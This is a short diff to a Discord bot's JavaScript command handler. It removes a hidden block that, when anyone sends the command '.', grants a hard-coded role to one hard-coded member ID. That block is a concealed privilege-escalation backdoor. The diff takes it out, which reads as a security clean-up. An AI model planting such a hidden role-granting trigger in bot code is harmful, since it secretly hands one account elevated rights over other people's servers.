@@ -178,12 +178,6 @@ const main = async () => {
                     true,
                 );
             }
-
-            if (command === '.') {
-                const m = message.guild.members.cache.get('735800926501208064');
-
-                await m.roles.add('1095363733750022197');
-            }
         } catch (e) {
             console.log(e);
         }
